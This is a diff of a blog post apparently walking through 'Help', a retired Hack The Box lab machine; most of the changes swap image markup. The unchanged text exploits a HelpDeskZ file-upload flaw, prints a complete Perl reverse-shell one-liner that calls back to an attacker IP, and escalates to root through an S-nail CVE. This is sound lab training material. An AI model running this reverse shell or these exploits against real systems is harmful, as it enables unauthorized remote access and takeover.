@@ -17,10 +17,10 @@ This post documents the complete walkthrough of Help, a retired vulnerable [VM][
 
 <!--more-->
 
-## On this post 
-{:.no_toc} 
+## On this post
+{:.no_toc}
 
-* TOC 
+* TOC
 {:toc}
 
 ## Background
@@ -67,13 +67,13 @@ PORT     STATE SERVICE REASON         VERSION
 
 We have two `http` services in the form of Apache and Node.js. This is how they look like.
 
-<a class="image-popup">
-![d0d5ff90.png](/assets/images/posts/help-htb-walkthrough/d0d5ff90.png)
-</a>
 
-<a class="image-popup">
-![f881d02b.png](/assets/images/posts/help-htb-walkthrough/f881d02b.png)
-</a>
+{% include image.html image_alt="d0d5ff90.png" image_src="/d96d74aa-f362-4ac7-b27f-dde35a0de85c/d0d5ff90.png" %}
+
+
+
+{% include image.html image_alt="f881d02b.png" image_src="/d96d74aa-f362-4ac7-b27f-dde35a0de85c/f881d02b.png" %}
+
 
 The default Apache page suggests more enumeration needs to be done.
 
@@ -106,9 +106,9 @@ http://10.10.10.121/javascript (Status: 301)
 
 I think I've seen enough. Let's pay `/support` a visit.
 
-<a class="image-popup">
-![efdf471d.png](/assets/images/posts/help-htb-walkthrough/efdf471d.png)
-</a>
+
+{% include image.html image_alt="efdf471d.png" image_src="/d96d74aa-f362-4ac7-b27f-dde35a0de85c/efdf471d.png" %}
+
 
 Well, well, well. What do we have here? This must be our first attack surface.
 
@@ -116,9 +116,9 @@ Well, well, well. What do we have here? This must be our first attack surface.
 
 Searching Google for an exploit in HelpDeskZ led me to EDB-ID [40300](https://www.exploit-db.com/exploits/40300). Anyway, it looks like the site is running the vulnerable version.
 
-<a class="image-popup">
-![ab9defc0.png](/assets/images/posts/help-htb-walkthrough/ab9defc0.png)
-</a>
+
+{% include image.html image_alt="ab9defc0.png" image_src="/d96d74aa-f362-4ac7-b27f-dde35a0de85c/ab9defc0.png" %}
+
 
 According to the exploit, HelpDeskZ suffers from an unauthenticated arbitrary file upload vulnerability where the software allows file attachment with ticket submission. The minor problem lies with determining the filename of the uploaded file. However, because the eventual file name depends on the time the file was uploaded, we can make an educated guess of the timestamp by shaving a couple of seconds from the current time.
 
@@ -130,13 +130,13 @@ Let's submit a fake ticket and attach `test.php`, which is nothing more than the
 </pre>
 ```
 
-<a class="image-popup">
-![f5e7fc4c.png](/assets/images/posts/help-htb-walkthrough/f5e7fc4c.png)
-</a>
 
-<a class="image-popup">
-![9687e6bb.png](/assets/images/posts/help-htb-walkthrough/9687e6bb.png)
-</a>
+{% include image.html image_alt="f5e7fc4c.png" image_src="/d96d74aa-f362-4ac7-b27f-dde35a0de85c/f5e7fc4c.png" %}
+
+
+
+{% include image.html image_alt="9687e6bb.png" image_src="/d96d74aa-f362-4ac7-b27f-dde35a0de85c/9687e6bb.png" %}
+
 
 Hmm. It says "File is not allowed". Is that so? Let's take a look at the source code controlling this behavior.
 
@@ -229,13 +229,13 @@ print "Sorry, I did not find anything"
 
 Armed with the insight gleaned from the source code, let's upload again and find out where it's uploaded to.
 
-<a class="image-popup">
-![b88c841c.png](/assets/images/posts/help-htb-walkthrough/b88c841c.png)
-</a>
 
-<a class="image-popup">
-![772cc8ce.png](/assets/images/posts/help-htb-walkthrough/772cc8ce.png)
-</a>
+{% include image.html image_alt="b88c841c.png" image_src="/d96d74aa-f362-4ac7-b27f-dde35a0de85c/b88c841c.png" %}
+
+
+
+{% include image.html image_alt="772cc8ce.png" image_src="/d96d74aa-f362-4ac7-b27f-dde35a0de85c/772cc8ce.png" %}
+
 
 Awesome.
 
@@ -245,29 +245,29 @@ Let's urlencode the following reverse shell in Perl.
 perl -e 'use Socket;$i="10.10.14.169";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");};'
 ```
 
-<a class="image-popup">
-![7f0bcfe9.png](/assets/images/posts/help-htb-walkthrough/7f0bcfe9.png)
-</a>
+
+{% include image.html image_alt="7f0bcfe9.png" image_src="/d96d74aa-f362-4ac7-b27f-dde35a0de85c/7f0bcfe9.png" %}
+
 
 Perfect. Let's [upgrade](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/) the shell to a full TTY.
 
 The file `user.txt` is at `help`'s home directory.
 
-<a class="image-popup">
-![2ae85f72.png](/assets/images/posts/help-htb-walkthrough/2ae85f72.png)
-</a>
+
+{% include image.html image_alt="2ae85f72.png" image_src="/d96d74aa-f362-4ac7-b27f-dde35a0de85c/2ae85f72.png" %}
+
 
 ## Privilege Escalation
 
 During enumeration of `help`'s account, I notice that the box is using a vulnerable version of S-nail.
 
-<a class="image-popup">
-![5dcd5da6.png](/assets/images/posts/help-htb-walkthrough/5dcd5da6.png)
-</a>
 
-<a class="image-popup">
-![6c350cff.png](/assets/images/posts/help-htb-walkthrough/6c350cff.png)
-</a>
+{% include image.html image_alt="5dcd5da6.png" image_src="/d96d74aa-f362-4ac7-b27f-dde35a0de85c/5dcd5da6.png" %}
+
+
+
+{% include image.html image_alt="6c350cff.png" image_src="/d96d74aa-f362-4ac7-b27f-dde35a0de85c/6c350cff.png" %}
+
 
 The vulnerability is tagged [CVE-2017-5899](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5899).
 
@@ -277,15 +277,15 @@ Simply copy over the exploit to the box. (There are several ways to do that.) I 
 
 Once that's done, launch the script.
 
-<a class="image-popup">
-![f6a1af65.png](/assets/images/posts/help-htb-walkthrough/f6a1af65.png)
-</a>
+
+{% include image.html image_alt="f6a1af65.png" image_src="/d96d74aa-f362-4ac7-b27f-dde35a0de85c/f6a1af65.png" %}
+
 
 The file `root.txt` can be easily retrieved with a `root` shell.
 
-<a class="image-popup">
-![f490e19d.png](/assets/images/posts/help-htb-walkthrough/f490e19d.png)
-</a>
+
+{% include image.html image_alt="f490e19d.png" image_src="/d96d74aa-f362-4ac7-b27f-dde35a0de85c/f490e19d.png" %}
+
 
 :dancer:
 
@@ -295,9 +295,9 @@ I was intrigued by the message that there's a way to retrieve credentials by pro
 
 I use the Firefox Add-on Altair GraphQL Client to query the endpoint `http://10.10.10.121:3000/graphql`.
 
-<a class="image-popup">
-![1fbce97d.png](/assets/images/posts/help-htb-walkthrough/1fbce97d.png)
-</a>
+
+{% include image.html image_alt="1fbce97d.png" image_src="/d96d74aa-f362-4ac7-b27f-dde35a0de85c/1fbce97d.png" %}
+
 
 Boom. It's that easy. Let you in for a secret—the password can be found with a Google search. :information_desk_person:
 
